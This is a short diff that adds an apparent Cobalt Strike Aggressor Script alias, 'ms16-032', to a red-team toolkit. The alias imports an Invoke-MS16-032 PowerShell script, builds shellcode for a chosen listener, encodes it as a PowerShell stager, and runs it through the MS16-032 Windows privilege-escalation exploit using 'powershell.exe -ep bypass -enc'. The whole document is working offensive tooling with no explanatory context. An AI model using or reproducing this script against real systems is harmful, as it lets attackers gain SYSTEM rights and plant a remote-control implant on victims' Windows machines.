@@ -1,0 +1,17 @@
+					
+
+alias ms16-032 {
+
+	
+	if(listener_info($2) is $null) {
+	berror($1,"no $2");
+	return;
+	}
+
+	bpowershell_import($1, script_resource("scripts/Invoke-MS16-032.ps1"));
+	$shellcode  = shellcode($2, false);
+	$readytouse = powershell_encode_stager($shellcode);
+	bpowershell($1,"Invoke-MS16-032 -Cmd \"powershell.exe -ep bypass -enc $readytouse\"");
+
+
+}
